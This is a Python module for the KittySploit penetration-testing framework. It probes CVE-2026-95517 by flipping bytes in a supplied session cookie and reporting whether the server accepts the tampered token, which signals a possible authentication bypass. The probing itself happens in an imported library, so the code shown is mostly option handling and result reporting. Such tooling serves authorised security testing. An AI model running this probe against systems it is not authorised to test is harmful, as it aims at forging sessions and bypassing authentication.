#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-95517 — Missing integrity on security cookie/token."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.token_integrity import Token_integrity


class Module(Auxiliary, Http_client, Token_integrity):
    __info__ = {
        "name": "Token integrity CVE-2026-95517 probe",
        "description": "Single-bit flip on cookie/token — server must reject if HMAC intact.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-95517"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-95517"],
        "tags": ["auth", "token", "cve-2026-95517", "auxiliary"],
        "agent": {"approval_required": True, "produces": ["auth_bypass"]},
    }

    session_token = OptString("", "Cookie value to tamper", required=True)
    cookie_name = OptString("session", "Cookie name", required=False)
    flip_index = OptString("0", "Byte index to flip (xor 0x01)", required=False)
    scan_flips = OptBool(False, "Flip every byte", required=False, advanced=True)

    def run(self):
        token = str(self.session_token or "").strip()
        if hasattr(self, "session_token") and hasattr(self.session_token, "value"):
            token = str(self.session_token.value or "").strip()
        if not token:
            print_error("session_token required")
            return False
        name = str(self.cookie_name or "session")
        scan = getattr(self, "scan_flips", False)
        if hasattr(scan, "value"):
            scan = scan.value
        idx = None if scan else int(str(self.flip_index or "0"))
        hits = self.token_flip_probe(token, name, flip_index=idx, scan_all=bool(scan))
        if not hits:
            print_error("No tampered token accepted")
            return False
        print_success(f"{len(hits)} flip(s) changed server behaviour")
        self.set_info(severity="critical", cve="CVE-2026-95517", accepted=hits[:5])
        return True